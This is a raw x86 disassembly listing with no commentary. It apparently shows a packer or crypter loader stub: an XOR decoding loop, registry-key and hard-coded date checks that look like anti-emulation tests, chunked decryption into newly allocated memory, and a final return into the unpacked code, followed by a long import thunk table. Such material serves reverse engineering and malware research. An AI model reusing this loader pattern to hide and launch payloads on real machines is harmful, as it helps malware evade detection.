  444e6d:	push   0x44ae4c
  444e72:	call   DWORD PTR ds:0x447cb4
  444e78:	push   0x0
  444e7a:	push   0x80
  444e7f:	push   0x3
  444e81:	push   0x0
  444e83:	push   0x3
  444e85:	push   0x1
  444e87:	push   0x44ae4c
  444e8c:	call   DWORD PTR ds:0x447cb8
  444e92:	mov    DWORD PTR [ebp-0x4],eax
  444e95:	cmp    DWORD PTR [ebp-0x4],0xffffffff
  444e99:	je     0x444ea1
  444e9b:	cmp    DWORD PTR [ebp-0x4],0x0
  444e9f:	jne    0x444ea8
  444ea1:	mov    eax,0x42
  444ea6:	jmp    0x444f11
  444ea8:	mov    DWORD PTR [ebp-0x8],0xdbc8
  444eaf:	mov    edx,DWORD PTR [ebp-0x10]
  444eb2:	add    edx,0x275
  444eb8:	mov    DWORD PTR ds:0x44af50,edx
  444ebe:	mov    eax,DWORD PTR [ebp+0x8]
  444ec1:	add    eax,DWORD PTR [ebp-0x10]
  444ec4:	mov    ecx,DWORD PTR [eax]
  444ec6:	add    ecx,DWORD PTR [ebp-0x10]
  444ec9:	mov    edx,DWORD PTR [ebp+0x8]
  444ecc:	add    edx,DWORD PTR [ebp-0x10]
  444ecf:	mov    DWORD PTR [edx],ecx
  444ed1:	mov    eax,DWORD PTR [ebp-0xc]
  444ed4:	mov    DWORD PTR [ebp-0x14],eax
  444ed7:	mov    DWORD PTR [ebp-0x8],0xdbc8
  444ede:	mov    ecx,DWORD PTR ds:0x44af50
  444ee4:	mov    DWORD PTR [ebp-0x24],ecx
  444ee7:	mov    edx,DWORD PTR [ebp-0x24]
  444eea:	mov    DWORD PTR [ebp-0x20],edx
  444eed:	mov    eax,DWORD PTR [ebp-0x20]
  444ef0:	mov    DWORD PTR [ebp-0x1c],eax
  444ef3:	mov    ecx,DWORD PTR [ebp-0x1c]
  444ef6:	mov    DWORD PTR [ebp-0x18],ecx
  444ef9:	mov    edx,DWORD PTR [ebp+0x8]
  444efc:	add    edx,DWORD PTR [ebp-0x10]
  444eff:	mov    eax,DWORD PTR [edx]
  444f01:	xor    eax,DWORD PTR [ebp-0x18]
  444f04:	mov    ecx,DWORD PTR [ebp+0x8]
  444f07:	add    ecx,DWORD PTR [ebp-0x10]
  444f0a:	mov    DWORD PTR [ecx],eax
  444f0c:	jmp    0x444e36
  444f11:	mov    esp,ebp
  444f13:	pop    ebp
  444f14:	ret    
  444f15:	int3   
  444f16:	int3   
  444f17:	int3   
  444f18:	int3   
  444f19:	int3   
  444f1a:	int3   
  444f1b:	int3   
  444f1c:	int3   
  444f1d:	int3   
  444f1e:	int3   
  444f1f:	int3   
  444f20:	push   ebp
  444f21:	mov    ebp,esp
  444f23:	sub    esp,0x14
  444f26:	mov    eax,DWORD PTR [ebp+0x8]
  444f29:	cmp    DWORD PTR [eax+0x4],0x0
  444f2d:	je     0x444f77
  444f2f:	mov    DWORD PTR [ebp-0x14],0x2a1
  444f36:	mov    ecx,DWORD PTR [ebp+0x8]
  444f39:	mov    edx,DWORD PTR [ecx+0x4]
  444f3c:	sub    edx,0x8
  444f3f:	shr    edx,1
  444f41:	mov    DWORD PTR [ebp-0xc],edx
  444f44:	mov    eax,DWORD PTR [ebp+0x8]
  444f47:	add    eax,0x8
  444f4a:	mov    DWORD PTR [ebp-0x10],eax
  444f4d:	mov    ecx,DWORD PTR [ebp+0x8]
  444f50:	push   ecx
  444f51:	mov    edx,DWORD PTR [ebp+0x10]
  444f54:	push   edx
  444f55:	mov    eax,DWORD PTR [ebp+0xc]
  444f58:	push   eax
  444f59:	mov    ecx,DWORD PTR [ebp-0x10]
  444f5c:	push   ecx
  444f5d:	mov    edx,DWORD PTR [ebp-0xc]
  444f60:	push   edx
  444f61:	call   0x444da0
  444f66:	add    esp,0x14
  444f69:	mov    eax,DWORD PTR [ebp+0x8]
  444f6c:	mov    ecx,DWORD PTR [ebp+0x8]
  444f6f:	add    ecx,DWORD PTR [eax+0x4]
  444f72:	mov    DWORD PTR [ebp+0x8],ecx
  444f75:	jmp    0x444f26
  444f77:	mov    esp,ebp
  444f79:	pop    ebp
  444f7a:	ret    
  444f7b:	int3   
  444f7c:	int3   
  444f7d:	int3   
  444f7e:	int3   
  444f7f:	int3   
  444f80:	push   ebp
  444f81:	mov    ebp,esp
  444f83:	sub    esp,0x8
  444f86:	mov    DWORD PTR [ebp-0x4],0x447018
  444f8d:	lea    eax,[ebp-0x8]
  444f90:	push   eax
  444f91:	push   0x20019
  444f96:	push   0x0
  444f98:	push   0x44ae40
  444f9d:	push   0x80000002
  444fa2:	call   DWORD PTR ds:0x44af54
  444fa8:	test   eax,eax
  444faa:	je     0x444fb3
  444fac:	xor    eax,eax
  444fae:	jmp    0x445054
  444fb3:	lea    ecx,[ebp-0x8]
  444fb6:	push   ecx
  444fb7:	push   0x20019
  444fbc:	push   0x0
  444fbe:	push   0x44ae44
  444fc3:	push   0x80000002
  444fc8:	call   DWORD PTR ds:0x44af54
  444fce:	test   eax,eax
  444fd0:	je     0x444fd6
  444fd2:	xor    eax,eax
  444fd4:	jmp    0x445054
  444fd6:	mov    edx,0x53
  444fdb:	mov    eax,DWORD PTR [ebp-0x4]
  444fde:	mov    WORD PTR [eax],dx
  444fe1:	lea    ecx,[ebp-0x8]
  444fe4:	push   ecx
  444fe5:	push   0x20019
  444fea:	push   0x0
  444fec:	mov    edx,DWORD PTR [ebp-0x4]
  444fef:	push   edx
  444ff0:	mov    eax,DWORD PTR [ebp-0x8]
  444ff3:	push   eax
  444ff4:	call   DWORD PTR ds:0x44af54
  444ffa:	test   eax,eax
  444ffc:	je     0x445002
  444ffe:	xor    eax,eax
  445000:	jmp    0x445054
  445002:	lea    ecx,[ebp-0x8]
  445005:	push   ecx
  445006:	push   0x20019
  44500b:	push   0x0
  44500d:	push   0x447030
  445012:	mov    edx,DWORD PTR [ebp-0x8]
  445015:	push   edx
  445016:	call   DWORD PTR ds:0x44af54
  44501c:	test   eax,eax
  44501e:	je     0x44502d
  445020:	push   0x1
  445022:	push   0x1
  445024:	push   0x1
  445026:	push   0x1
  445028:	call   0x444f80
  44502d:	lea    eax,[ebp-0x8]
  445030:	push   eax
  445031:	push   0x20019
  445036:	push   0x0
  445038:	push   0x4470a8
  44503d:	mov    ecx,DWORD PTR [ebp-0x8]
  445040:	push   ecx
  445041:	call   DWORD PTR ds:0x44af54
  445047:	test   eax,eax
  445049:	jne    0x44504f
  44504b:	xor    eax,eax
  44504d:	jmp    0x445054
  44504f:	call   0x444d70
  445054:	mov    esp,ebp
  445056:	pop    ebp
  445057:	ret    0x10
  44505a:	int3   
  44505b:	int3   
  44505c:	int3   
  44505d:	int3   
  44505e:	int3   
  44505f:	int3   
  445060:	push   ebp
  445061:	mov    ebp,esp
  445063:	sub    esp,0x4d4
  445069:	pusha  
  44506a:	mov    DWORD PTR ds:0x44af58,ebp
  445070:	mov    DWORD PTR [ebp-0x4a0],0x0
  44507a:	mov    DWORD PTR [ebp-0x4b4],0x80000002
  445084:	mov    DWORD PTR [ebp-0x8],0xe1d58000
  44508b:	mov    DWORD PTR [ebp-0x4],0x1a8e79f
  445092:	mov    eax,ds:0x4480a8
  445097:	mov    ds:0x44af54,eax
  44509c:	lea    ecx,[ebp-0x4b8]
  4450a2:	push   ecx
  4450a3:	lea    edx,[ebp-0x4bc]
  4450a9:	push   edx
  4450aa:	lea    eax,[ebp-0x8]
  4450ad:	push   eax
  4450ae:	call   DWORD PTR ds:0x447cbc
  4450b4:	movzx  ecx,WORD PTR [ebp-0x4bc]
  4450bb:	cmp    ecx,0x21
  4450be:	je     0x4450c7
  4450c0:	xor    eax,eax
  4450c2:	jmp    0x445395
  4450c7:	push   0x1
  4450c9:	push   0x1
  4450cb:	push   0x1
  4450cd:	push   0x1
  4450cf:	call   0x444f80
  4450d4:	mov    DWORD PTR [ebp-0x424],0x0
  4450de:	mov    DWORD PTR [ebp-0x494],0x64
  4450e8:	mov    DWORD PTR [ebp-0x42c],0x5
  4450f2:	mov    DWORD PTR [ebp-0x4a0],0x0
  4450fc:	mov    DWORD PTR [ebp-0x464],0x0
  445106:	mov    DWORD PTR [ebp-0x490],0x1
  445110:	mov    DWORD PTR [ebp-0x428],0x3
  44511a:	mov    edx,DWORD PTR ds:0x44ae48
  445120:	push   edx
  445121:	call   0x444d90
  445126:	add    esp,0x4
  445129:	mov    DWORD PTR [ebp-0x4a4],eax
  44512f:	mov    eax,DWORD PTR [ebp-0x4a4]
  445135:	push   eax
  445136:	call   0x444cf0
  44513b:	add    esp,0x4
  44513e:	mov    DWORD PTR [ebp-0x49c],eax
  445144:	mov    ecx,DWORD PTR [ebp-0x4a4]
  44514a:	push   ecx
  44514b:	push   0x0
  44514d:	mov    edx,DWORD PTR [ebp-0x49c]
  445153:	push   edx
  445154:	call   0x444d30
  445159:	add    esp,0xc
  44515c:	mov    eax,DWORD PTR [ebp-0x4a4]
  445162:	mov    DWORD PTR [ebp-0x4ac],eax
  445168:	mov    ecx,DWORD PTR [ebp-0x4a0]
  44516e:	cmp    ecx,DWORD PTR [ebp-0x4a4]
  445174:	jae    0x445200
  44517a:	mov    edx,DWORD PTR [ebp-0x4ac]
  445180:	push   edx
  445181:	mov    eax,DWORD PTR [ebp-0x494]
  445187:	push   eax
  445188:	call   0x444d40
  44518d:	add    esp,0x8
  445190:	mov    DWORD PTR [ebp-0x4b0],eax
  445196:	mov    ecx,DWORD PTR [ebp-0x4b0]
  44519c:	push   ecx
  44519d:	mov    edx,DWORD PTR ds:0x44ae48
  4451a3:	add    edx,DWORD PTR [ebp-0x464]
  4451a9:	push   edx
  4451aa:	mov    eax,DWORD PTR [ebp-0x49c]
  4451b0:	add    eax,DWORD PTR [ebp-0x4a0]
  4451b6:	push   eax
  4451b7:	call   0x445ce2
  4451bc:	add    esp,0xc
  4451bf:	mov    ecx,DWORD PTR [ebp-0x42c]
  4451c5:	add    ecx,DWORD PTR [ebp-0x494]
  4451cb:	add    ecx,DWORD PTR [ebp-0x464]
  4451d1:	mov    DWORD PTR [ebp-0x464],ecx
  4451d7:	mov    edx,DWORD PTR [ebp-0x4a0]
  4451dd:	add    edx,DWORD PTR [ebp-0x494]
  4451e3:	mov    DWORD PTR [ebp-0x4a0],edx
  4451e9:	mov    eax,DWORD PTR [ebp-0x4ac]
  4451ef:	sub    eax,DWORD PTR [ebp-0x4b0]
  4451f5:	mov    DWORD PTR [ebp-0x4ac],eax
  4451fb:	jmp    0x445168
  445200:	mov    ecx,DWORD PTR [ebp-0x4a4]
  445206:	push   ecx
  445207:	mov    edx,DWORD PTR [ebp-0x49c]
  44520d:	push   edx
  44520e:	call   0x444e20
  445213:	add    esp,0x8
  445216:	mov    DWORD PTR [ebp-0x464],0x0
  445220:	mov    DWORD PTR [ebp-0x4c4],0x0
  44522a:	call   0x444d80
  44522f:	mov    eax,ds:0x44ae48
  445234:	push   eax
  445235:	call   0x444d90
  44523a:	add    esp,0x4
  44523d:	mov    DWORD PTR [ebp-0x4c8],eax
  445243:	mov    ecx,DWORD PTR [ebp-0x4c8]
  445249:	push   ecx
  44524a:	call   0x444cf0
  44524f:	add    esp,0x4
  445252:	mov    DWORD PTR [ebp-0x460],eax
  445258:	mov    edx,DWORD PTR [ebp-0x4c8]
  44525e:	push   edx
  44525f:	push   0x0
  445261:	mov    eax,DWORD PTR [ebp-0x460]
  445267:	push   eax
  445268:	call   0x444d30
  44526d:	add    esp,0xc
  445270:	mov    ecx,DWORD PTR [ebp-0x4c8]
  445276:	mov    DWORD PTR [ebp-0x4d0],ecx
  44527c:	mov    edx,DWORD PTR [ebp-0x4c4]
  445282:	cmp    edx,DWORD PTR [ebp-0x4c8]
  445288:	jae    0x445313
  44528e:	mov    eax,DWORD PTR [ebp-0x4d0]
  445294:	push   eax
  445295:	mov    ecx,DWORD PTR [ebp-0x494]
  44529b:	push   ecx
  44529c:	call   0x444d40
  4452a1:	add    esp,0x8
  4452a4:	mov    DWORD PTR [ebp-0x4d4],eax
  4452aa:	mov    edx,DWORD PTR [ebp-0x4d4]
  4452b0:	push   edx
  4452b1:	mov    eax,ds:0x44ae48
  4452b6:	add    eax,DWORD PTR [ebp-0x464]
  4452bc:	push   eax
  4452bd:	mov    ecx,DWORD PTR [ebp-0x460]
  4452c3:	add    ecx,DWORD PTR [ebp-0x4c4]
  4452c9:	push   ecx
  4452ca:	call   0x445ce2
  4452cf:	add    esp,0xc
  4452d2:	mov    edx,DWORD PTR [ebp-0x42c]
  4452d8:	add    edx,DWORD PTR [ebp-0x494]
  4452de:	add    edx,DWORD PTR [ebp-0x464]
  4452e4:	mov    DWORD PTR [ebp-0x464],edx
  4452ea:	mov    eax,DWORD PTR [ebp-0x4c4]
  4452f0:	add    eax,DWORD PTR [ebp-0x494]
  4452f6:	mov    DWORD PTR [ebp-0x4c4],eax
  4452fc:	mov    ecx,DWORD PTR [ebp-0x4d0]
  445302:	sub    ecx,DWORD PTR [ebp-0x4d4]
  445308:	mov    DWORD PTR [ebp-0x4d0],ecx
  44530e:	jmp    0x44527c
  445313:	mov    edx,DWORD PTR [ebp-0x4c8]
  445319:	push   edx
  44531a:	mov    eax,DWORD PTR [ebp-0x460]
  445320:	push   eax
  445321:	call   0x444e20
  445326:	add    esp,0x8
  445329:	mov    ecx,DWORD PTR [ebp-0x49c]
  44532f:	mov    edx,DWORD PTR [ebp-0x460]
  445335:	mov    DWORD PTR [ecx],edx
  445337:	push   0x42000
  44533c:	call   0x444cf0
  445341:	add    esp,0x4
  445344:	mov    DWORD PTR [ebp-0xc],eax
  445347:	push   0x3f800
  44534c:	mov    eax,DWORD PTR [ebp-0x49c]
  445352:	push   eax
  445353:	mov    ecx,DWORD PTR [ebp-0xc]
  445356:	add    ecx,0x300
  44535c:	push   ecx
  44535d:	call   0x445ce2
  445362:	add    esp,0xc
  445365:	mov    edx,DWORD PTR [ebp-0xc]
  445368:	sub    edx,0x400000
  44536e:	push   edx
  44536f:	mov    eax,DWORD PTR [ebp-0xc]
  445372:	push   eax
  445373:	mov    ecx,DWORD PTR [ebp-0x460]
  445379:	push   ecx
  44537a:	call   0x444f20
  44537f:	add    esp,0xc
  445382:	mov    esp,DWORD PTR ds:0x44af58
  445388:	pop    eax
  445389:	mov    eax,DWORD PTR [ebp-0xc]
  44538c:	add    eax,0x3f7e0
  445391:	push   eax
  445392:	xor    ecx,ecx
  445394:	ret    
  445395:	mov    esp,ebp
  445397:	pop    ebp
  445398:	ret    
  445399:	jmp    DWORD PTR ds:0x447a68
  44539f:	jmp    DWORD PTR ds:0x447a6c
  4453a5:	jmp    DWORD PTR ds:0x447a70
  4453ab:	jmp    DWORD PTR ds:0x447a74
  4453b1:	jmp    DWORD PTR ds:0x447a78
  4453b7:	jmp    DWORD PTR ds:0x447a7c
  4453bd:	jmp    DWORD PTR ds:0x447a80
  4453c3:	jmp    DWORD PTR ds:0x447a84
  4453c9:	jmp    DWORD PTR ds:0x447a88
  4453cf:	jmp    DWORD PTR ds:0x447a8c
  4453d5:	jmp    DWORD PTR ds:0x447a90
  4453db:	jmp    DWORD PTR ds:0x447a94
  4453e1:	jmp    DWORD PTR ds:0x447a98
  4453e7:	jmp    DWORD PTR ds:0x447a9c
  4453ed:	jmp    DWORD PTR ds:0x447aa0
  4453f3:	jmp    DWORD PTR ds:0x447aa4
  4453f9:	jmp    DWORD PTR ds:0x447aa8
  4453ff:	jmp    DWORD PTR ds:0x447aac
  445405:	jmp    DWORD PTR ds:0x447ab0
  44540b:	jmp    DWORD PTR ds:0x447ab4
  445411:	jmp    DWORD PTR ds:0x447ab8
  445417:	jmp    DWORD PTR ds:0x447abc
  44541d:	jmp    DWORD PTR ds:0x447ac0
  445423:	jmp    DWORD PTR ds:0x447ac4
  445429:	jmp    DWORD PTR ds:0x447ac8
  44542f:	jmp    DWORD PTR ds:0x447acc
  445435:	jmp    DWORD PTR ds:0x447ad0
  44543b:	jmp    DWORD PTR ds:0x447ad4
  445441:	jmp    DWORD PTR ds:0x447ad8
  445447:	jmp    DWORD PTR ds:0x447adc
  44544d:	jmp    DWORD PTR ds:0x447ae0
  445453:	jmp    DWORD PTR ds:0x447ae4
  445459:	jmp    DWORD PTR ds:0x447ae8
  44545f:	jmp    DWORD PTR ds:0x447aec
  445465:	jmp    DWORD PTR ds:0x447af0
  44546b:	jmp    DWORD PTR ds:0x447af4
  445471:	jmp    DWORD PTR ds:0x447af8
  445477:	jmp    DWORD PTR ds:0x447afc
  44547d:	jmp    DWORD PTR ds:0x447b00
  445483:	jmp    DWORD PTR ds:0x447b04
  445489:	jmp    DWORD PTR ds:0x447b08
  44548f:	jmp    DWORD PTR ds:0x447b0c
  445495:	jmp    DWORD PTR ds:0x447b10
  44549b:	jmp    DWORD PTR ds:0x447b14
  4454a1:	jmp    DWORD PTR ds:0x447b18
  4454a7:	jmp    DWORD PTR ds:0x447b1c
  4454ad:	jmp    DWORD PTR ds:0x447b20
  4454b3:	jmp    DWORD PTR ds:0x447b24
  4454b9:	jmp    DWORD PTR ds:0x447b28
  4454bf:	jmp    DWORD PTR ds:0x447b2c
  4454c5:	jmp    DWORD PTR ds:0x447b30
  4454cb:	jmp    DWORD PTR ds:0x447b34
  4454d1:	jmp    DWORD PTR ds:0x447b38
  4454d7:	jmp    DWORD PTR ds:0x447b3c
  4454dd:	jmp    DWORD PTR ds:0x447b40
  4454e3:	jmp    DWORD PTR ds:0x447b44
  4454e9:	jmp    DWORD PTR ds:0x447b48
  4454ef:	jmp    DWORD PTR ds:0x447b4c
  4454f5:	jmp    DWORD PTR ds:0x447b50
  4454fb:	jmp    DWORD PTR ds:0x447b54
  445501:	jmp    DWORD PTR ds:0x447b58
  445507:	jmp    DWORD PTR ds:0x447b5c
  44550d:	jmp    DWORD PTR ds:0x447b60
  445513:	jmp    DWORD PTR ds:0x447b64
  445519:	jmp    DWORD PTR ds:0x447b68
  44551f:	jmp    DWORD PTR ds:0x447b6c
  445525:	jmp    DWORD PTR ds:0x447b70
  44552b:	jmp    DWORD PTR ds:0x447b74
  445531:	jmp    DWORD PTR ds:0x447b78
  445537:	jmp    DWORD PTR ds:0x447b7c
  44553d:	jmp    DWORD PTR ds:0x447b80
  445543:	jmp    DWORD PTR ds:0x447b84
  445549:	jmp    DWORD PTR ds:0x447b88
  44554f:	jmp    DWORD PTR ds:0x447b8c
  445555:	jmp    DWORD PTR ds:0x447b90
  44555b:	jmp    DWORD PTR ds:0x447b94
  445561:	jmp    DWORD PTR ds:0x447b98
  445567:	jmp    DWORD PTR ds:0x447b9c
  44556d:	jmp    DWORD PTR ds:0x447ba0
  445573:	jmp    DWORD PTR ds:0x447ba4
  445579:	jmp    DWORD PTR ds:0x447ba8
  44557f:	jmp    DWORD PTR ds:0x447bac
  445585:	jmp    DWORD PTR ds:0x447bb0
  44558b:	jmp    DWORD PTR ds:0x447bb4
  445591:	jmp    DWORD PTR ds:0x447bb8
  445597:	jmp    DWORD PTR ds:0x447bbc
  44559d:	jmp    DWORD PTR ds:0x447bc0
  4455a3:	jmp    DWORD PTR ds:0x447bc4
  4455a9:	jmp    DWORD PTR ds:0x447bc8
  4455af:	jmp    DWORD PTR ds:0x447bcc
  4455b5:	jmp    DWORD PTR ds:0x447bd0
  4455bb:	jmp    DWORD PTR ds:0x447bd4
  4455c1:	jmp    DWORD PTR ds:0x447bd8
  4455c7:	jmp    DWORD PTR ds:0x447bdc
  4455cd:	jmp    DWORD PTR ds:0x447be0
  4455d3:	jmp    DWORD PTR ds:0x447be4
  4455d9:	jmp    DWORD PTR ds:0x447be8
  4455df:	jmp    DWORD PTR ds:0x447bec
  4455e5:	jmp    DWORD PTR ds:0x447bf0
  4455eb:	jmp    DWORD PTR ds:0x447bf4
  4455f1:	jmp    DWORD PTR ds:0x447bf8
  4455f7:	jmp    DWORD PTR ds:0x447bfc
  4455fd:	jmp    DWORD PTR ds:0x447c00
  445603:	jmp    DWORD PTR ds:0x447c04
  445609:	jmp    DWORD PTR ds:0x447c08
  44560f:	jmp    DWORD PTR ds:0x447c0c
  445615:	jmp    DWORD PTR ds:0x447c10
  44561b:	jmp    DWORD PTR ds:0x447c14
  445621:	jmp    DWORD PTR ds:0x447c18
  445627:	jmp    DWORD PTR ds:0x447c1c
  44562d:	jmp    DWORD PTR ds:0x447c20
  445633:	jmp    DWORD PTR ds:0x447c24
  445639:	jmp    DWORD PTR ds:0x447c28
  44563f:	jmp    DWORD PTR ds:0x447c2c
  445645:	jmp    DWORD PTR ds:0x447c30
  44564b:	jmp    DWORD PTR ds:0x447c34
  445651:	jmp    DWORD PTR ds:0x447c38
  445657:	jmp    DWORD PTR ds:0x447c3c
  44565d:	jmp    DWORD PTR ds:0x447c40
  445663:	jmp    DWORD PTR ds:0x447c44
  445669:	jmp    DWORD PTR ds:0x447c48
  44566f:	jmp    DWORD PTR ds:0x447c4c
  445675:	jmp    DWORD PTR ds:0x447c50
  44567b:	jmp    DWORD PTR ds:0x447c54
  445681:	jmp    DWORD PTR ds:0x447c58
  445687:	jmp    DWORD PTR ds:0x447c5c
  44568d:	jmp    DWORD PTR ds:0x447c60
  445693:	jmp    DWORD PTR ds:0x447c64
  445699:	jmp    DWORD PTR ds:0x447c68
  44569f:	jmp    DWORD PTR ds:0x447c6c
  4456a5:	jmp    DWORD PTR ds:0x447c70
  4456ab:	jmp    DWORD PTR ds:0x447c74
  4456b1:	jmp    DWORD PTR ds:0x447c78
  4456b7:	jmp    DWORD PTR ds:0x447c7c
  4456bd:	jmp    DWORD PTR ds:0x447c80
  4456c3:	jmp    DWORD PTR ds:0x447c84
  4456c9:	jmp    DWORD PTR ds:0x447c88
  4456cf:	jmp    DWORD PTR ds:0x447c8c
  4456d5:	jmp    DWORD PTR ds:0x447c90
  4456db:	jmp    DWORD PTR ds:0x447c94
  4456e1:	jmp    DWORD PTR ds:0x447c98
  4456e7:	jmp    DWORD PTR ds:0x447c9c
  4456ed:	jmp    DWORD PTR ds:0x447ca0
  4456f3:	jmp    DWORD PTR ds:0x447ca4
  4456f9:	jmp    DWORD PTR ds:0x447ca8
  4456ff:	jmp    DWORD PTR ds:0x447cac
  445705:	jmp    DWORD PTR ds:0x447cb0
  44570b:	jmp    DWORD PTR ds:0x447cb4
  445711:	jmp    DWORD PTR ds:0x447cb8
  445717:	jmp    DWORD PTR ds:0x447cbc
  44571d:	jmp    DWORD PTR ds:0x447cc4
  445723:	jmp    DWORD PTR ds:0x447cc8
  445729:	jmp    DWORD PTR ds:0x447ccc
  44572f:	jmp    DWORD PTR ds:0x447cd0
  445735:	jmp    DWORD PTR ds:0x447cd4
  44573b:	jmp    DWORD PTR ds:0x447cd8
  445741:	jmp    DWORD PTR ds:0x447cdc
  445747:	jmp    DWORD PTR ds:0x447ce0
  44574d:	jmp    DWORD PTR ds:0x447ce4
  445753:	jmp    DWORD PTR ds:0x447ce8
  445759:	jmp    DWORD PTR ds:0x447cec
  44575f:	jmp    DWORD PTR ds:0x447cf0
  445765:	jmp    DWORD PTR ds:0x447cf4
  44576b:	jmp    DWORD PTR ds:0x447cf8
  445771:	jmp    DWORD PTR ds:0x447cfc
  445777:	jmp    DWORD PTR ds:0x447d00
  44577d:	jmp    DWORD PTR ds:0x447d04
  445783:	jmp    DWORD PTR ds:0x447d08
  445789:	jmp    DWORD PTR ds:0x447d0c
  44578f:	jmp    DWORD PTR ds:0x447d10
  445795:	jmp    DWORD PTR ds:0x447d14
  44579b:	jmp    DWORD PTR ds:0x447d18
  4457a1:	jmp    DWORD PTR ds:0x447d1c
  4457a7:	jmp    DWORD PTR ds:0x447d20
  4457ad:	jmp    DWORD PTR ds:0x447d24
  4457b3:	jmp    DWORD PTR ds:0x447d28
  4457b9:	jmp    DWORD PTR ds:0x447d2c
  4457bf:	jmp    DWORD PTR ds:0x447d30
  4457c5:	jmp    DWORD PTR ds:0x447d34
  4457cb:	jmp    DWORD PTR ds:0x447d38
  4457d1:	jmp    DWORD PTR ds:0x447d3c
  4457d7:	jmp    DWORD PTR ds:0x447d40
  4457dd:	jmp    DWORD PTR ds:0x447d44
  4457e3:	jmp    DWORD PTR ds:0x447d48
  4457e9:	jmp    DWORD PTR ds:0x447d4c
  4457ef:	jmp    DWORD PTR ds:0x447d50
  4457f5:	jmp    DWORD PTR ds:0x447d54
  4457fb:	jmp    DWORD PTR ds:0x447d58
  445801:	jmp    DWORD PTR ds:0x447d5c
  445807:	jmp    DWORD PTR ds:0x447d60
  44580d:	jmp    DWORD PTR ds:0x447d64
  445813:	jmp    DWORD PTR ds:0x447d68
  445819:	jmp    DWORD PTR ds:0x447d6c
  44581f:	jmp    DWORD PTR ds:0x447d70
  445825:	jmp    DWORD PTR ds:0x447d74
  44582b:	jmp    DWORD PTR ds:0x447d78
  445831:	jmp    DWORD PTR ds:0x447d7c
  445837:	jmp    DWORD PTR ds:0x447d80
  44583d:	jmp    DWORD PTR ds:0x447d84
  445843:	jmp    DWORD PTR ds:0x447d88
  445849:	jmp    DWORD PTR ds:0x447d8c
  44584f:	jmp    DWORD PTR ds:0x447d90
  445855:	jmp    DWORD PTR ds:0x447d94
  44585b:	jmp    DWORD PTR ds:0x447d98
  445861:	jmp    DWORD PTR ds:0x447d9c
  445867:	jmp    DWORD PTR ds:0x447da0
  44586d:	jmp    DWORD PTR ds:0x447da4
  445873:	jmp    DWORD PTR ds:0x447da8
  445879:	jmp    DWORD PTR ds:0x447dac
  44587f:	jmp    DWORD PTR ds:0x447db0
  445885:	jmp    DWORD PTR ds:0x447db4
  44588b:	jmp    DWORD PTR ds:0x447db8
  445891:	jmp    DWORD PTR ds:0x447dbc
  445897:	jmp    DWORD PTR ds:0x447dc0
  44589d:	jmp    DWORD PTR ds:0x447dc4
  4458a3:	jmp    DWORD PTR ds:0x447dc8
  4458a9:	jmp    DWORD PTR ds:0x447dcc
  4458af:	jmp    DWORD PTR ds:0x447dd0
  4458b5:	jmp    DWORD PTR ds:0x447dd4
  4458bb:	jmp    DWORD PTR ds:0x447dd8
  4458c1:	jmp    DWORD PTR ds:0x447ddc
  4458c7:	jmp    DWORD PTR ds:0x447de0
  4458cd:	jmp    DWORD PTR ds:0x447de4
  4458d3:	jmp    DWORD PTR ds:0x447de8
  4458d9:	jmp    DWORD PTR ds:0x447dec
  4458df:	jmp    DWORD PTR ds:0x447df0
  4458e5:	jmp    DWORD PTR ds:0x447df4
  4458eb:	jmp    DWORD PTR ds:0x447df8
  4458f1:	jmp    DWORD PTR ds:0x447dfc
  4458f7:	jmp    DWORD PTR ds:0x447e00
  4458fd:	jmp    DWORD PTR ds:0x447e04
  445903:	jmp    DWORD PTR ds:0x447e08
  445909:	jmp    DWORD PTR ds:0x447e0c
  44590f:	jmp    DWORD PTR ds:0x447e10
  445915:	jmp    DWORD PTR ds:0x447e14
  44591b:	jmp    DWORD PTR ds:0x447e18
  445921:	jmp    DWORD PTR ds:0x447e1c
  445927:	jmp    DWORD PTR ds:0x447e20
  44592d:	jmp    DWORD PTR ds:0x447e24
  445933:	jmp    DWORD PTR ds:0x447e28
  445939:	jmp    DWORD PTR ds:0x447e2c
  44593f:	jmp    DWORD PTR ds:0x447e30
  445945:	jmp    DWORD PTR ds:0x447e34
  44594b:	jmp    DWORD PTR ds:0x447e38
  445951:	jmp    DWORD PTR ds:0x447e3c
  445957:	jmp    DWORD PTR ds:0x447e40
  44595d:	jmp    DWORD PTR ds:0x447e44
  445963:	jmp    DWORD PTR ds:0x447e48
  445969:	jmp    DWORD PTR ds:0x447e4c
  44596f:	jmp    DWORD PTR ds:0x447e50
  445975:	jmp    DWORD PTR ds:0x447e54
  44597b:	jmp    DWORD PTR ds:0x447e58
  445981:	jmp    DWORD PTR ds:0x447e5c
  445987:	jmp    DWORD PTR ds:0x447e60
  44598d:	jmp    DWORD PTR ds:0x447e64
  445993:	jmp    DWORD PTR ds:0x447e68
  445999:	jmp    DWORD PTR ds:0x447e6c
  44599f:	jmp    DWORD PTR ds:0x447e70
  4459a5:	jmp    DWORD PTR ds:0x447e74
  4459ab:	jmp    DWORD PTR ds:0x447e78
  4459b1:	jmp    DWORD PTR ds:0x447e7c
  4459b7:	jmp    DWORD PTR ds:0x447e80
  4459bd:	jmp    DWORD PTR ds:0x447e84
  4459c3:	jmp    DWORD PTR ds:0x447e88
  4459c9:	jmp    DWORD PTR ds:0x447e8c
  4459cf:	jmp    DWORD PTR ds:0x447e90
  4459d5:	jmp    DWORD PTR ds:0x447e94
  4459db:	jmp    DWORD PTR ds:0x447e98
  4459e1:	jmp    DWORD PTR ds:0x447e9c
  4459e7:	jmp    DWORD PTR ds:0x447ea0
  4459ed:	jmp    DWORD PTR ds:0x447ea4
  4459f3:	jmp    DWORD PTR ds:0x447ea8
  4459f9:	jmp    DWORD PTR ds:0x447eac
  4459ff:	jmp    DWORD PTR ds:0x447eb0
  445a05:	jmp    DWORD PTR ds:0x447eb4
  445a0b:	jmp    DWORD PTR ds:0x447eb8
  445a11:	jmp    DWORD PTR ds:0x447ebc
  445a17:	jmp    DWORD PTR ds:0x447ec0
  445a1d:	jmp    DWORD PTR ds:0x447ec4
  445a23:	jmp    DWORD PTR ds:0x447ec8
  445a29:	jmp    DWORD PTR ds:0x447ecc
  445a2f:	jmp    DWORD PTR ds:0x447ed0
  445a35:	jmp    DWORD PTR ds:0x447ed4
  445a3b:	jmp    DWORD PTR ds:0x447ed8
  445a41:	jmp    DWORD PTR ds:0x447edc
  445a47:	jmp    DWORD PTR ds:0x447ee0
  445a4d:	jmp    DWORD PTR ds:0x447ee4
  445a53:	jmp    DWORD PTR ds:0x447ee8
  445a59:	jmp    DWORD PTR ds:0x447eec
  445a5f:	jmp    DWORD PTR ds:0x447ef0
  445a65:	jmp    DWORD PTR ds:0x447ef4
